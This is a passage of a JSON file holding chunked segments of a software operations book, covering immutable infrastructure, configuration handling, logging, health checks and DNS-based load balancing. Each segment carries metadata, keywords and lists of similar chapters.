          "method": "sentence_transformers"
        },
        {
          "book": "Microservice Architecture",
          "chapter": 14,
          "title": "Segment 14 (pages 106-114)",
          "relevance_score": 0.54,
          "method": "sentence_transformers"
        },
        {
          "book": "Designing Machine Learning Systems An Iterative Process for Production-Ready Applications",
          "chapter": 40,
          "title": "Segment 40 (pages 342-350)",
          "relevance_score": 0.53,
          "method": "sentence_transformers"
        },
        {
          "book": "Microservice Architecture",
          "chapter": 13,
          "title": "Segment 13 (pages 98-105)",
          "relevance_score": 0.52,
          "method": "sentence_transformers"
        },
        {
          "book": "Microservices Up and Running",
          "chapter": 16,
          "title": "Segment 16 (pages 157-170)",
          "relevance_score": 0.52,
          "method": "sentence_transformers"
        }
      ]
    },
    {
      "number": 21,
      "title": "Segment 21 (pages 166-173)",
      "start_page": 166,
      "end_page": 173,
      "detection_method": "topic_boundary",
      "content": "Code • 159\n\nConﬁgMgmt\n\nConﬁgScripts\n\nPackageRepository\n\nBase Image\n\nState 1\n\nState 3\n\nState 2\n\nexample, suppose a Chef recipe uses RPM to install version 12.04 of a third- party package. That package has a post-install script that changes some TCP tuning parameters. A month later, Chef installs a newer version of the RPM, but the new RPM’s post-install changes a subset of the original parameters. Now the machine has a state that cannot be re-created by either the original or the new recipes. That state is the result of the history of the changes.\n\nThe second challenge comes from broken machines or scripts that only par- tially worked. These leave the machine in an undefined state. The configuration management tools put a lot of effort into converging unknown machine states into known machine states, but they aren’t always successful.\n\nThe DevOps and cloud community say that it’s more reliable to always start from a known base image, apply a fixed set of changes, and then never attempt to patch or update that machine. Instead, when a change is needed, create a new image starting from the base again, as shown in the figure on page 160.\n\nThis is often described as “immutable infrastructure.” Machines don’t change once they’ve been deployed. Take a container as an example. The container’s “file system” is a binary image from a repository. It holds the code that runs on the instance. When it’s time to deploy new code, we don’t patch up the container; we just build a new one instead. We launch it and throw away the old one.\n\nreport erratum • discuss\n\nChapter 8. Processes on Machines • 160\n\nBase Image\n\nConﬁgMgmt\n\nConﬁgScripts\n\nPackageRepository\n\nBase Image\n\nState 1\n\nState 3\n\nState 2\n\nBase Image\n\nThat notion of disposability puts the emphasis in the right place. The impor- tant part is that we can throw away the environment, piece by piece or as a whole, and start over.\n\nConfiguration\n\nEvery piece of production-class software has scads of configurable properties containing hostnames, port numbers, filesystem locations, ID numbers, magic keys, usernames, passwords, and lottery numbers. Get any of these properties wrong and the system is broken. Even if the system seems to work most of the time, it could break at 1 a.m. when Daylight Saving Time kicks in.\n\n“Configuration” suffers from hidden linkages and high complexity—two of the biggest factors leading to operator error. This puts the system at risk because configuration is part of the system’s user interface. It’s the interface used by one of its most overlooked constituencies: the developers and operators who support it. Let’s look at some design guidelines for handling instance-level configuration.\n\nConfiguration Files\n\nThe configuration “starter kit” is a file or set of files the instance reads at startup. Configuration files may be buried deep in the directory structure of\n\nreport erratum • discuss\n\nConfiguration • 161\n\nthe codebase, possibly in multiple directories. Some of them represent basic application plumbing like API routes. Others need to change per environment.\n\nBecause the same software runs on several instances, some configuration properties should probably vary per machine. Keep these properties in separate places so nobody ever has to ask, “Are those supposed to be different?”\n\nWe don’t want our instance binaries to change per environment, but we do want their properties to change. That means the code should look outside the deployment directory to find per-environment configurations.\n\nThese files contain the most sensitive information in the entire enterprise: production database passwords. They need to be protected from tampering and prying eyes. That leads us to another great reason to keep per-environ- ment configuration out of the source tree: version control. Sooner or later, you’ll accidentally commit a production password to version control. GitHub currently shows 288,093 commits with the title “Removed password.” Tomorrow that number will be higher.\n\nThat’s not to say you should keep configurations out of version control alto- gether. Just keep them in a different repository than the source code. Lock it down to only the people who should have access, and make sure you have controls (i.e., processes, procedures, and people following up on them) to grant and revoke access to those configurations.\n\nConfiguration with Disposable Infrastructure\n\nIn image-based environments like EC2 or a container platform, configuration files can’t change per instance. Frankly, some of the instances will be there and gone so fast that it doesn’t make any sense to apply static configs. There we need to find another way to provide a new instance with details about its mission in life. The two approaches are to inject configuration at startup or use a configuration service.\n\nInjecting configuration works by providing environment variables or a text blob. For example, EC2 allows “user data” to be passed to a new virtual machine as a blob of text. To use the user data, some code in the image must already know how to read and parse it (for example, it might be in properties format, but it might be JSON or YAML, too). Heroku prefers environment variables. So the application code does need some awareness of its targeted deployment environment.\n\nThe other way to get configuration into an image is via a configuration service. In this form, the instance code reaches out to a well-known location to ask\n\nreport erratum • discuss\n\nChapter 8. Processes on Machines • 162\n\nfor its configuration. ZooKeeper and etcd are both popular choices for a con- figuration service. Because this builds a hard dependency on the config service, any downtime is immediately a “Severity 1” problem. Instances cannot start up when the config service is not available, yet by definition we’re in an environment where instances start and stop frequently.\n\nBe very careful here. ZooKeeper and etcd—and any other configuration service, for that matter—are complex pieces of distributed systems software. They must have a well-planned network topology to maximize availability, and they must be managed very carefully for capacity. ZooKeeper is scalable but not elastic, and adding and removing nodes is disruptive. In other words, these services require a high degree of operational maturity and carry some noticeable overhead. It’s not worth introducing them to support just one application. Only use them as part of a broader strategy for your organization. Most small teams are better off using injected config.\n\nNaming Configuration Properties\n\nProperty names should be clear enough to help the user avoid “unforced errors.” When you see a property called hostname, how do you know which hostname to fill in? Is that “my hostname,” “the name of the authorized caller,” or “the host I call during the autumnal solstice?” It’s better to name the properties according to their function, not their nature. Don’t call it hostname just because it is a hostname. That’s like naming a variable integer because it’s an integer or string because it’s a string. It may be true, but it’s not helpful. Name it authenticationProvider instead, and then the admin knows to look for an LDAP or Active Directory host.\n\nTransparency\n\nShipboard engineers can tell when something is about to go wrong by the sound of the giant diesel engines. They’ve learned, by living with their engines, to recognize normal, nominal, and abnormal. They are constantly surrounded by the sounds and rhythms of their environment. When something is wrong, the engineers’ knowledge of the linkages within the engines can lead them to the problem with speed and accuracy—and with just one or two clues—in a way that can seem psychic.\n\nThe power plant in a ship radiates information through ambient sounds and vibration, through gauges with quantitative information, and in extreme (usually bad) cases through smell. Our systems aren’t so naturally exposed. They run in invisible, faceless, far-distant boxes. We don’t see or hear the fans spin. No giant reel-to-reel tape drives whiz back and forth. If we are to get the kind of “environmental awareness” that the shipboard engineers\n\nreport erratum • discuss\n\nTransparency • 163\n\nnaturally acquire, we must facilitate that awareness by building transparency into our systems.\n\nTransparency refers to the qualities that allow operators, developers, and business sponsors to gain understanding of the system’s historical trends, present conditions, instantaneous state, and future projections. Transparent systems communicate, and in communicating, they train their attendant humans.\n\nIn debugging the “Black Friday problem” (see Chapter 6, Case Study: Phenom- enal Cosmic Powers, Itty-Bitty Living Space, on page 129), we relied on compo- nent-level visibility into the system’s current behavior. That visibility was no accident. It was the product of enabling technologies implemented with transparency and feedback in mind. Without that level of visibility, we prob- ably could’ve known that the site was slow (if a disgruntled user called us or someone in the business happened to hit the site) but have no idea why. It would be like having a sick goldfish—nothing you do can help, so you just wait and see whether it lives or dies.\n\nDebugging a transparent system is vastly easier, so transparent systems will mature faster than opaque ones.\n\nWhen making technical or architectural changes, you are totally dependent on data collected from the existing infrastructure. Good data enables good decision-making. In the absence of trusted data, decisions will be made for you based on somebody’s political clout, prejudices, or whoever has the best “executive style” hair.\n\nFinally, a system without transparency cannot survive long in production. If administrators don’t know what the system is doing, it can’t be tuned and optimized. If developers don’t know what works and doesn’t work in produc- tion, they can’t increase its reliability or resilience over time. And if the busi- ness sponsors don’t know whether they’re making money on it, they won’t fund future work. Without transparency, the system will drift into decay, functioning a bit worse with each release. Systems can mature well if, and only if, they have some degree of transparency.\n\nThis section takes our first slice at transparency. We’ll see what machine and service instances must do to create transparency. Later, in Chapter 10, Control Plane, on page 193, we see how to knit instance-level information with other sources to create system-level transparency. That system-level view will provide historical analysis, present state, instantaneous behavior, and future projec- tions. The job of an individual instance is to reveal enough data to enable those perspectives.\n\nreport erratum • discuss\n\nChapter 8. Processes on Machines • 164\n\nDesigning for Transparency\n\nTransparency arises from deliberate design and architecture. “Adding trans- parency” late in development is about as effective as “adding quality.” Maybe it can be done, but only with greater effort and cost than if it’d been built in from the beginning.\n\nVisibility inside one application or server is not enough. Strictly local visibility leads to strictly local optimization. For example, a retailer ran a major project to get items appearing on the site faster. The nightly update was running until 5 or 6 a.m., when it needed to complete closer to midnight. This project optimized the string of batch jobs that fed content to the site. The project met its goals, in that the batch jobs finished two hours earlier. Items still did not appear on the site, however, until a long-running parallel process finished, at 5 or 6 a.m. The local optimization on the batch jobs had no global effect.\n\nVisibility into one application at a time can also mask problems with scaling effects. For instance, observing cache flushes on one application server would not reveal that each server was knocking items out of all the other servers’ caches. Every time an item was displayed, it was accidentally being updated, therefore causing a cache invalidation notice to all other servers. As soon as all the caches’ statistics appeared on one page, the problem was obvious. Without that visibility, we would’ve added many servers to reach the necessary capacity—and each server would’ve made the problem worse.\n\nIn designing for transparency, keep a close eye on coupling. It’s relatively easy for the monitoring framework to intrude on the internals of the system. The monitoring and reporting systems should be like an exoskeleton built around your system, not woven into it. In particular, decisions about what metrics should trigger alerts, where to set the thresholds, and how to “roll up” state variables into an overall system health status should all be left outside of the instance itself. These are policy decisions that will change at a very different rate than the application code will.\n\nEnabling Technologies\n\nBy its nature, a process running on an instance is totally opaque. Unless you’re running a debugger on the process, it reveals practically nothing about itself. It might be working fine, it might be running on its very last thread, or it might be spinning in circles doing nothing. Like Schrödinger’s cat, it’s impossible to tell whether the process is alive or dead until you look at it.\n\nThe very first trick, then, is getting information out of the process. This section examines the most important enabling technologies that reduce the opacity\n\nreport erratum • discuss\n\nTransparency • 165\n\nof that process boundary. You can classify these as either “white-box” or “black-box” technologies.\n\nA black-box technology sits outside the process, examining it through exter- nally observable things. Black-box technologies can be implemented after the system is delivered, usually by operations. Even though black-box technologies are unknown to the system being observed, you can still do helpful things during development to facilitate the use of these tools. Good logging is one example. Instances should log their health and events to a plain old text file. Any log-scraper can collect these without disturbing the server process.\n\nBy contrast, white-box technology runs inside the process. This kind of technology often looks like an agent delivered in a language-specific library. These must be integrated during development. White-box technologies neces- sarily have tighter coupling to the language and framework than black-box technologies.\n\nWhite-box technology often comes with an API that the application can call directly. This provides a great increase in transparency, because the applica- tion can emit very specific, relevant events and metrics. It comes at the cost of coupling to that provider. That coupling is a small price to pay when com- pared to the degree of clarity it provides.\n\nLogging\n\nDespite millions of R&D dollars on “enterprise application management” suites and spiffy operations centers with giant plasma monitors showing color-coded network maps, good old log files are still the most reliable, versatile information vehicle. It’s worth a chuckle once in a while to realize that here we are, in the twenty-first century, and log files are still one of our most valuable tools.\n\nLogging is certainly a white-box technology; it must be integrated pervasively into the source code. Nevertheless, logging is ubiquitous for a number of good reasons. Log files reflect activity within an application. Therefore, they reveal the instantaneous behavior of that application. They’re also persistent, so they can be examined to understand the system’s status—though that often requires some “digestion” to trace state transitions into current states.\n\nIf you want to avoid tight coupling to a particular monitoring tool or frame- work, then log files are the way to go. Nothing is more loosely coupled than log files; every framework or tool that exists can scrape log files. This loose coupling means log files are also valuable in development, where you are less likely to find ops tools.\n\nreport erratum • discuss\n\nChapter 8. Processes on Machines • 166\n\nEven in the face of this value, log files are badly abused. Here are some keys to successful logging.\n\nLog Locations\n\nDespite what all those application templates create for us, a logs directory under the application’s install directory is the wrong way to go. Log files can be large. They grow rapidly and consume lots of I/O. For physical machines, it’s a good idea to keep them on a separate drive. That lets the machine use more I/O bandwidth in parallel and reduces contention for the busy drives.\n\nEven if your instance runs in a VM, it’s still a good idea to separate log files out from application code. The code directory needs to be locked down and have as little write permission as possible (ideally, none).\n\nApps running in containers usually just emit messages on standard out, since the container itself can capture or redirect that.\n\nIf you make the log file locations configurable, then administrators can just set the right property to locate the files. If you don’t make the location config- urable, then they’ll probably relocate the files anyway, but you might not like how it gets done. Odds are it’ll involve a lot of symlinks.\n\nOn UNIX systems, symlinks are the most common workaround. This involves creating a symbolic link from the logs directory to the actual location of the files. There’s a small I/O penalty on each file open, but not much compared to the penalty of contention for a busy drive. I’ve also seen a separate filesystem dedicated to logs mounted directly underneath the installation directory.\n\nLogging Levels\n\nAs humans read (or even just scan) log files for a new system, they learn what “normal” means for that system. Some applications, particularly young ones, are very noisy; they generate a lot of errors in their logs. Some are quiet, reporting nothing during normal operation. In either case, the applications will train their humans on what’s healthy or normal.\n\nMost developers implement logging as though they are the primary consumer of the log files. In fact, administrators and engineers in operations will spend far more time with these log files than developers will. Logging should be aimed at production operations rather than development or testing. One consequence is that anything logged at level “ERROR” or “SEVERE” should be something that requires action on the part of operations. Not every exception needs to be logged as an error. Just because a user entered a bad credit card number and the validation component threw an exception doesn’t\n\nreport erratum • discuss",
      "page_number": 166,
      "chapter_number": 21,
      "summary": "This chapter covers segment 21 (pages 166-173). Key topics include instance, configuration, and configurations. Code\n\nEven before we get to questions about containers versus VM images, we should look at some things about the code.",
      "keywords": [
        "Instance Machine haproxy",
        "Configuration",
        "Machine",
        "HAProxy load balancer",
        "Machine haproxy",
        "Code",
        "system",
        "n’t",
        "Instance",
        "Machine Instance",
        "Base Image State",
        "state",
        "Base Image"
      ],
      "concepts": [
        "instance",
        "configuration",
        "configurations",
        "code",
        "machine",
        "transparency",
        "transparent",
        "users",
        "report",
        "controls"
      ],
      "similar_chapters": [
        {
          "book": "Designing Machine Learning Systems An Iterative Process for Production-Ready Applications",
          "chapter": 40,
          "title": "Segment 40 (pages 342-350)",
          "relevance_score": 0.57,
          "method": "sentence_transformers"
        },
        {
          "book": "Microservice APIs Using Python Flask FastAPI",
          "chapter": 37,
          "title": "Segment 37 (pages 378-388)",
          "relevance_score": 0.51,
          "method": "sentence_transformers"
        },
        {
          "book": "Microservices Up and Running",
          "chapter": 2,
          "title": "Segment 2 (pages 9-16)",
          "relevance_score": 0.51,
          "method": "sentence_transformers"
        },
        {
          "book": "Microservices Up and Running",
          "chapter": 31,
          "title": "Segment 31 (pages 305-313)",
          "relevance_score": 0.51,
          "method": "sentence_transformers"
        },
        {
          "book": "Python Microservices Development",
          "chapter": 35,
          "title": "Segment 35 (pages 296-303)",
          "relevance_score": 0.5,
          "method": "sentence_transformers"
        }
      ]
    },
    {
      "number": 22,
      "title": "Segment 22 (pages 174-181)",
      "start_page": 174,
      "end_page": 181,
      "detection_method": "topic_boundary",
      "content": "Transparency • 167\n\nmean anything has to be done about it. Log errors in business logic or user input as warnings (if at all). Reserve “ERROR” for a serious system problem. For example, a circuit breaker tripping to “open” is an error. It’s something that should not happen under normal circumstances, and it probably means action is required on the other end of the connection. Failure to connect to a database is an error—there’s a problem with either the network or the database server. A NullPointerException isn’t automatically an error.\n\nDebug Logs in Production\n\nWhile I’m on the subject of logging levels, I’ll address a pet peeve of mine: “debug” logs in production. This is rarely a good idea and can create so much noise that real issues get buried in tons of method traces or trivial checkpoints. It’s easy to leave debug messages turned on in production. All it takes is one wrong commit with debug levels enabled. I recommend adding a step to your build process that automatically removes any configs that enable debug or trace log levels.\n\nHuman Factors\n\nAbove all else, log files are human-readable. That means they constitute a human-computer interface and should be examined in terms of human factors. This might sound trivial—even laughable—but in a stressful situation, such as a Severity 1 incident, human misinterpretation of status information can prolong or aggravate the problem. Operators for the Three Mile Island reactor misinterpreted the meaning of coolant pressure and temperature values, leading them to take exactly the wrong action at every turn. (See Inviting Disaster [Chi01], pages 49–63.) Although most of our systems will not vent radioactive steam when they break, they will expel our money and our repu- tation. Therefore, it behooves us to ensure that log files convey clear, accurate, and actionable information to the humans who read them.\n\nIf log files are a human interface, then they should also be written such that humans can recognize and interpret them as rapidly as possible. The format should be as readable as possible. Formats that break columns and create a ragged left-to-right scanning pattern are not human-readable.\n\nVoodoo Operations\n\nAs I said before, humans are good at detecting patterns. In fact, we appear to have a natural bias toward detecting patterns, even when they aren’t there. In Why People Believe Weird Things [She97], Michael Shermer discusses the evolutionary impact of pattern detection. Early humans who failed to detect a real pattern—such as a pattern of light and shadow that turned out to be\n\nreport erratum • discuss\n\nChapter 8. Processes on Machines • 168\n\na leopard—were less likely to pass on their genes than those who detected patterns that weren’t there and ran away from a clump of bushes that hap- pened to look like a leopard.\n\nIn other words, the cost of a false positive—“detecting” a pattern that wasn’t —was minimal, whereas the cost of a false negative—failing to detect a pattern that was there—was high. Shermer claims that this evolutionary pressure creates a tendency toward superstitions. I’ve seen it in action.\n\nGiven a system on the verge of failure, administrators in operations have to proceed through observation, analysis, hypothesis, and action very quickly. If that action appears to resolve the issue, it becomes part of the lore, possibly even part of a documented knowledge base. Who says it was the right action, though? What if it’s just a coincidence?\n\nI once found a practice in the operations group for one of my early commerce applications that was no better than witchcraft. I happened to be in an administrator’s cubicle when her pager went off. On seeing the message, she immediately logged into the production server and started a database failover. Curious, and more than a little alarmed, I asked what was going on. She told me that this one message showed that a database server was about to fail, so they had to fail over to the other node and restart the primary database. When I looked at the actual message, I got cold shivers. It said, “Data channel lifetime limit reached. Reset required.”\n\nNaturally, I recognized that message, having written it myself. The thing was, it had nothing at all to do with the database. It was a debug message (see Debug Logs in Production, on page 167) informing me that an encrypted channel to an outside vendor had been up and running long enough that the encryption key would soon be vulnerable to discovery, just because of the amount of encrypted data that the channel served. It happened about once a week.\n\nPart of the problem was the wording of the message. “Reset required” doesn’t say who has to do the reset. If you looked at the code, it was clear that the application itself reset the channel right after emitting that message—but the consumers of the message didn’t have the code. Also, it was a debug message that I had left enabled so I could get an idea of how often it happened at normal volumes. I just forgot to ever turn it off.\n\nI traced the origin of this myth back about six months to a system failure that happened shortly after launch. That “Reset required” message was the last thing logged before the database went down. There was no causal connec- tion, but there was a temporal connection. (There was no advance warning about the database crash—it required a patch from the vendor, which we had\n\nreport erratum • discuss\n\nTransparency • 169\n\napplied shortly after the outage.) That temporal connection, combined with an ambiguous, obscurely worded message, led the administrators to perform weekly database failovers during peak hours for six months.\n\nFinal Notes on Logging\n\nMessages should include an identifier that can be used to trace the steps of a transaction. This might be a user’s ID, a session ID, a transaction ID, or even an arbitrary number assigned when the request comes in. When it’s time to read ten thousand lines of a log file (after an outage, for example), having a string to grep will save tons of time.\n\nInteresting state transitions should be logged, even if you plan to use SNMP traps or JMX notifications to inform monitoring about them. Logging the state transitions takes a few seconds of additional coding, but it leaves options open downstream. Besides, the record of state transitions will be important during postmortem investigations.\n\nInstance Metrics\n\nThe instance itself won’t be able to tell much about overall system health, but it should emit metrics that can be collected, analyzed, and visualized centrally. This may be as simple as periodically spitting a line of stats into a log file. The stronger your log-scraping tools are, the more attractive this option will be. Within a large organization, this is probably the best choice.\n\nAn ever-growing number of systems have outsourced their metrics collection to companies like New Relic and Datadog. In these cases, providers supply plugins to run with different applications and runtime environments. They’ll have one for Python apps, one for Ruby apps, one for Oracle, one for Microsoft SQL Server, and so on. Small teams can get going much faster by using one of these services. That way you don’t have to devote time to the care and feeding of metrics infrastructure—which can be substantial. Some developers from Netflix have quipped that Netflix is a monitoring system that streams movies as a side effect.\n\nHealth Checks\n\nMetrics can be hard to interpret. It takes some time to learn what “normal” looks like in the metrics. For quicker, easier summary information we can create a health check as part of the instance itself. A health check is just a page or API call that reveals the application’s internal view of its own health. It returns data for other systems to read (although that may just be nicely attributed HTML).\n\nreport erratum • discuss\n\nChapter 8. Processes on Machines • 170\n\nHealth checks should be more than just “yup, it’s running.” It should report at least the following:\n\nThe host IP address or addresses\n\nThe version number of the runtime or interpreter (Ruby, Python, JVM,\n\n.Net, Go, and so on)\n\nThe application version or commit ID\n\nWhether the instance is accepting work\n\nThe status of connection pools, caches, and circuit breakers\n\nThe health check is an important part of traffic management, which we’ll examine further in Chapter 9, Interconnect, on page 171. Clients of the instance shouldn’t look at the health check directly; they should be using a load bal- ancer to reach the service. The load balancer can use the health check to tell if a machine has crashed, but it can also use the health check for the “go live” transition, too. When the health check on a new instance goes from failing to passing, it means the app is done with its startup.\n\nWrapping Up\n\nInstances are the basic blocks that make up our system. They’re like cobble- stone Minecraft blocks—not that interesting by themselves, but we can make amazing things out of them. If we do a good job of building code to run in instances, then we can make a solid large-scale structure. That means instances should be designed for production. We’ve seen how to make them deployable, configurable, and monitorable. Now we need to look at how we can connect instances together into a whole system. This “interconnect” layer provides many of our most important mechanisms for availability and security, yet it often gets overlooked. In the next chapter we’ll see how to design this important layer for production.\n\nreport erratum • discuss\n\nCHAPTER 9\n\nInterconnect\n\nIn the previous chapter, we looked at instances running on machines. But really, who is interested in a single instance running by itself? A standalone process might as well be on a desert island. We need to connect them together into a system. This chapter continues our iterative zoom-out to look at how the instances work together and find each other, as well as how callers invoke them. It’s time to look at the “interconnect” layer from our schematic (shown in the following figure).\n\nFoundationHardware, VMs, IP addresses, physical network\n\nInstancesServices, processes, components, instance monitoring\n\nInterconnectRouting, load balancing, failover, traﬃc management\n\nControl PlaneSystem monitoring, deployment, anomaly detection, features\n\nOperationsSecurity, availability, capacity, status, communication\n\nThe interconnect layer covers all the mechanisms that knit a bunch of instances together into a cohesive system. That includes traffic management, load balancing, and discovery. The interconnect layer is where we can really create high availability. As with the instance level, we also need to create transparency and control. None of it happens by accident.\n\nreport erratum • discuss\n\nChapter 9. Interconnect • 172\n\nSolutions at Different Scales\n\nIn previous chapters, we’ve dealt with different solutions, depending on your production environment: physical, virtual, cloud, or container. As we move up the stack into interconnect, control plane, and operations, we also need to consider what solution is right for your organization. For instance, some techniques for service discovery and invocation depend on extra pieces of software. A large team or department with hundreds of small services would do well to use Consul or another dynamic discovery service. The cost of run- ning and operating Consul is easily amortized over the number of teams that benefit. Not to mention, the rate of change is going to be high enough to jus- tify something highly dynamic. On the other hand, a small business with just a few developers should probably stick with direct DNS entries. Changes aren’t going to be as rapid and the developers can keep services up-to-date.\n\nWhat is it that makes a discovery service feasible for the large company? For one thing, it can deal with a high rate of change in both the services included and in the location of the instances in those services. When the rate of change is high, it becomes impossible to update static configuration in service con- sumers. You’d be reconfiguring services several times a day. Also, because service discovery is itself another service, it increases the operational surface area. (Or maybe we should say “service area”?) That’s probably acceptable to the large company because a dedicated operations team and even a “platform” or “ecosystem” team probably run such tools. Finally, in a large company, it’s unlikely that every developer will be aware of every other developer’s changes. It would be unrealistic to believe that service consumers could stay up-to-date with IP address changes in their providers, especially in a highly virtualized, cloud, or container infrastructure.\n\nIn the small company, the opposite is true in every aspect: the rate of change is lower because fewer developers are generating changes. There may not be a sep- arate operations team at all, and the developers might all have lunch together.\n\nHaving read all that, you must also take it with a grain of salt. The balance point keeps changing as tools get more powerful. Big companies push the boundaries of dynamic platforms and bring us tools like Spinnaker, Kuber- netes, Mesos, and Consul. As they create these open-source platforms and ops tools, they put amazing abilities in the reach of even small teams. At one time, monitoring software cost megabucks. Now open source dominates that space, and even the smallest team should (must) have monitoring in place. Open-source ops tools democratize these abilities. Open-source PaaS tools are on the upswing as of this writing.\n\nreport erratum • discuss\n\nDNS • 173\n\nSo as we look at the solutions in the rest of this chapter, it will be helpful to consider each in terms of the rate of change or dynamism it supports, how much operational support it requires, and how much global knowledge it requires.\n\nDNS\n\nLet’s start with the basics and look at DNS. For small teams this is likely to be your best choice, particularly in a slowly changing infrastructure. That would include dedicated physical machines and dedicated, long-lived virtual machines. In these environments, IP addresses will remain stable enough for DNS to be useful.\n\nService Discovery with DNS\n\n“Service discovery” usually implies some kind of automated query and response, but not in this case. When you use DNS to call another service, discovery is more Sherlock Holmes than Siri. Your team needs to find the service owners and pry the DNS name or names out of them. An exchange of favors may be required, maybe a six-pack of beer in the extreme. Once you’ve finished the human protocol, you just put the “host” name into a configuration file and forget about it.\n\nWhen a client calls a service, the provider of that service may only have a single DNS name. That implies the provider is responsible for load balancing and high availability. If the provider has several names, then it’s up to the caller to balance among them.\n\nWhen using DNS, it’s important to have a logical service name to call, rather than a physical hostname. Even if that logical name is just an alias to the underlying host, it’s still preferable. An alias only needs to be changed in one place (the name server’s database) rather than in every consuming application.\n\nLoad Balancing with DNS\n\nDNS round-robin load balancing is one of the oldest techniques—dating back to the early days of the web. It operates at the application layer (layer 7) of the OSI stack; but instead of operating during a service request, it operates during address resolution.\n\nDNS round-robin simply associates several IP addresses with the service name. So instead of finding a single IP address for “shipping.example.com,” a client would get one of several addresses. Each IP address points to a single server. The client therefore connects to one out of a pool of servers, as shown in the figure on page 174.\n\nreport erratum • discuss\n\nChapter 9. Interconnect • 174\n\nInstance 2shipping2.example.com10.1.1.142\n\nDNS Serverns1.example.com\n\nInstance 1shipping1.example.com10.1.1.141\n\nshipping.example.com?\n\nCaller\n\n10.1.1.142\n\nGET /rates\n\n200 OK ...\n\nshipping.example.com?\n\nGET /rates\n\n200 OK ...\n\n10.1.1.143\n\nAlthough this serves the basic purpose of distributing work across a group of machines, it does poorly on other fronts. For one thing, all the instances in the pool must be directly “routable” from callers. They may sit behind a firewall, but their front-end IP addresses are visible and reachable from clients.\n\nSecond, the DNS round-robin approach suffers from putting too much control in the client’s hands. Since the client connects directly to one of the servers, there’s no opportunity to redirect that traffic if one particular instance is down. The DNS server has no information about the health of the instances, so it can keep vending out IP addresses for instances that are toast. Further- more, doling out IP addresses in round-robin style does not guarantee that the load is distributed evenly, just the initial connections. Some clients consume more resources than others, leading to unbalanced workloads. Again, when one of the instances gets busy, the DNS server has no way to know, so it just keeps sending every eleventh connection (or whatever) to the staggering instance.\n\nDNS round-robin load balancing is also inappropriate whenever the calling system is a long-running enterprise system. Anything using Java’s built-in classes will cache the first IP address it receives from DNS, guaranteeing that every future connection targets the same instance and completely defeating load balancing.\n\nreport erratum • discuss",
      "page_number": 174,
      "chapter_number": 22,
      "summary": "This provides a great increase in transparency, because the applica- tion can emit very specific, relevant events and metrics Key topics include logs, logged.",
      "keywords": [
        "log files",
        "log",
        "files",
        "system",
        "health check",
        "instance",
        "logs",
        "health",
        "log file locations",
        "message",
        "logging",
        "n’t",
        "operations",
        "report erratum",
        "application"
      ],
      "concepts": [
        "log",
        "logs",
        "logged",
        "instances",
        "operations",
        "operation",
        "operators",
        "operating",
        "monitors",
        "tools"
      ],
      "similar_chapters": [
        {
          "book": "Python Microservices Development",
          "chapter": 21,
          "title": "Segment 21 (pages 167-174)",
          "relevance_score": 0.5,
          "method": "sentence_transformers"
        },
        {
          "book": "Python Architecture Patterns",
          "chapter": 8,
          "title": "[ 259 ]",
          "relevance_score": 0.48,
          "method": "sentence_transformers"
        },
        {
          "book": "Game Programming Gems 3",
          "chapter": 13,
          "title": "Segment 13 (pages 129-137)",
          "relevance_score": 0.47,
          "method": "sentence_transformers"
        },
        {
          "book": "Building Python Microservices with FastAPI",
          "chapter": 13,
          "title": "Segment 13 (pages 109-116)",
          "relevance_score": 0.46,
          "method": "sentence_transformers"
        },
        {
          "book": "Python Distilled",
          "chapter": 30,
          "title": "Segment 30 (pages 269-279)",
          "relevance_score": 0.45,
          "method": "sentence_transformers"
        }
      ]
    },
    {
      "number": 23,
      "title": "Segment 23 (pages 182-191)",
      "start_page": 182,
      "end_page": 191,
      "detection_method": "topic_boundary",
      "content": "DNS • 175\n\nGlobal Server Load Balancing with DNS\n\nDNS has enough limitations when it comes to load balancing across instances that it’s usually worth moving up the stack a bit. However, there’s one place where DNS excels: global server load balancing (GSLB).\n\nGSLB tries to route clients across multiple geographic locations (see the figure that follows). This can be for physical data centers of your own or for multiple regions in a cloud infrastructure. We see this most in the context of external clients routing across the public Internet. Clients will get the best performance by routing to a nearby location—bearing in mind that “nearby” in network terms doesn’t always match physical geography the way you’d expect.\n\nPublic IP of Name Server162.159.24.4Public IP of Name Server204.74.70.31\n\nLocal Load Balancer\n\nLocal Load Balancer\n\nGSLB-aware DNSserver\n\nGSLB-aware DNSserver\n\nNorth AmericaEurope\n\nServiceInstances\n\nServiceInstances\n\nhealthchecksPublic IP of price.example.com151.101.116.133 Private IPs of Instances10.28.100.xx\n\nhealthchecks\n\nPublic IP of price.example.com184.72.248.171 Private IPs of Instances10.147.212.xx\n\nEach location has one or more pools of load-balanced instances for the ser- vice, as shown in the previous illustration. Each pool has an IP address that goes to the load balancer. (See Migratory Virtual IP Addresses, on page 189, for load balancing with virtual IPs.) The job of GSLB is just to get the request to the virtual IP address for a particular pool. GSLB works via specialized DNS servers at each location. Where an ordinary DNS server just has a static database of names and addresses, a GSLB server keeps track of the health and responsiveness of the pools. It offers up the underlying address only if it passes health checks. If the pool is offline, or doesn’t have any healthy instance to serve the request, the GSLB server won’t even give out the IP address of the pool.\n\nreport erratum • discuss\n\nChapter 9. Interconnect • 176\n\nThe second trick is that different GSLB servers may give back different IP addresses for the same request. This can be to balance across several local pools, or to provide the closest point of presence for the client. The following figure illustrates this process.\n\n200 OK ...\n\nEU Name Server204.74.70.31\n\nEU Pool 1184.72.248.171\n\nprice.example.com?\n\nCaller\n\n184.72.248.171\n\nGET /price\n\nGET /price\n\n200 OK ...\n\nNA Name Server162.159.24.4\n\nprice.example.com?\n\n151.101.116.133\n\nInstance 2eu-price-2.example.com10.147.212.102\n\n1. First the caller queries DNS for the address related to “price.example.com.”\n\n2. Both GSLB servers might respond. Each one returns a different address for “price.example.com.” The European server returns 184.72.248.171, while the North American server returns 151.101.116.113. In this example, the client is in Europe, so it probably got the response with 184.72.248.171 first.\n\n4. The client now connects directly to 184.72.248.171, which is served by the load balancer. The load balancer directs traffic to the instances just as it normally would. It’s important to keep in mind that this sequence operates at two different levels. At the global level, it’s based on DNS and clever schemes for deciding which IP address to offer. After name resolution, it’s out of the picture. The load balancer (sometimes called a “local traffic manager”) operates as a reverse proxy so the actual call and response pass through it.\n\nThis approach also requires that the caller can reach both the global traffic managers and the local traffic managers.\n\nThis scenario just illustrates the most basic use of GSLB. In practice, the global traffic managers can apply a ton of intelligence to the routing decision. For instance, the previous figure assumed that each GSLB server only knew about its local pools. In a real deployment, each would have all the pools configured but would prefer to send traffic nearby. That allows them to direct traffic to the more distant pool if that’s the only one available. They can also\n\nreport erratum • discuss\n\nLoad Balancing • 177\n\napply weighted distribution and a host of load-balancing algorithms. These can be used as part of a disaster recovery strategy or even part of a rolling deployment process.\n\nAvailability of DNS\n\nDNS relies on 